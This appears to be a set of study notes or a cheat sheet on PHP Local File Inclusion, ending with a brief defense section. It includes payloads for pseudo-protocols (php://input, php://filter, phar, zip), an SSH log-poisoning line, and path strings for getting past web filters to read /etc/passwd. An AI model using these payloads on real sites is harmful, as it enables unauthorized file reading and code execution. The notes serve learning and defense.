# Environment  
Here I would put some settings that you need to know before starting on Local File Inclusion. In `php.ini`:  
1. `allow_url_include` (default: off and makes it impossible to RFI)  
2. `session.auto_start` (default: off and makes it hard to create session)  
3. `session.upload_progress.cleanup` (default: On and makes it hard to include the session)  

# Methods to include  
File inclusion is always used to arbitrary code execution:  
1. pseudo protocol  
```php
php://input
// ConditionÔºöallow_url_include = on
?file=php://input
POST data: xxx

php://filter
// get base-64 encoded source code
?file=php://filter/read=convert.base64-encode/resource=file.php
// It's important that filter can be used to handle string with various ways, please take a look at the reference#1
php://filter/write=string.strip_tags|convert.base64-decode/resource=shell.php

phar://path.zip/file.php
// php5.3.0up, parse the archived file
// Sam Thomas publish a new use of phar able to unserialize without unserialize() function, please take a look at my Unserialization part

zip://path.zip%23file.php
// php5.3.0up, work as phar://, but need absolute path, and need to encode # as %23
```

2. Session inclusion  
* [include tmp with phpinfo](https://github.com/vulhub/vulhub/tree/master/php/inclusion)

[Session Upload Progress ](http://php.net/manual/en/session.upload-progress.php)  

3. Log inclusion  
**Permission** to read the log?  
Take apache for example, request would be written to `access.log`, and error would be written to `error.log`. The default stored path is `/var/log/apache2/`  
Therefore, attacker always needs to get the path with config file, and pay attention to the fact that whether the request would be encoded (use burp to modify the encoded request), then include the log in the end  

4. SSH log inclusion  
**Permission** to read?  
Default path: `/var/log/apache2/access.log`,`/var/log/apache2/error.log`  
```php
ssh '<?php phpinfo();?>'@remotehost
// phpinfo in log, and include
```  

5. include `/proc/self/environ`: php requires to run as CGI  

6. include uploaded file: need uploading functionality on website itself   

# WAF bypass  
* Relative path bypass  
WAF usually detect **continuous** multiple `../`
```php
// according to parsing path

// not change
/./ not change
///./..//.//////./   -> use with conbination
```  
* Absolute path bypass, `/etc/passwd` would be blocked  
```php
/aaa/../etc/passwd
/etc/./passwd
```  

# Inject path to session id
[CVE-2018-18925](https://github.com/vulhub/vulhub/tree/master/gogs/CVE-2018-18925)  
The cause of this bug is that framework use file as the session provider, but not all framework do the same things. You can try to include the other file as fake session.  

# Defense  
Make a conclusion of the requirement above, we can get the following mitigation  
* php `open_basedir`  
* read permission  
* filter of dangerous characters
